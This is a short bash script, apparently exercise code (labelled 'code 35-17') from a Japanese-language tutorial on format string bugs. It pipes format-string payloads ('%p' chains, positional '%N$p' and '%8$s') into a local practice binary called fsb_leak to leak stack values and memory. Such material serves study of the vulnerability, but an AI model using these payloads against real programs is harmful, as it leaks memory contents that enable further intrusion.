#!/bin/bash

# NULLまでしか出力されない
echo '%p %p %p %p %p %p %p %p %p' | ./fsb_leak

# 引数のオフセットを指定
echo '%1$p' | ./fsb_leak; echo
echo '%2$p' | ./fsb_leak; echo
echo '%3$p' | ./fsb_leak; echo
echo '%4$p' | ./fsb_leak; echo
echo '%5$p' | ./fsb_leak; echo
echo '%6$p' | ./fsb_leak; echo
echo '%7$p' | ./fsb_leak; echo
echo '%8$p' | ./fsb_leak; echo

# code 35-17
echo '%8$s' | ./fsb_leak; echo
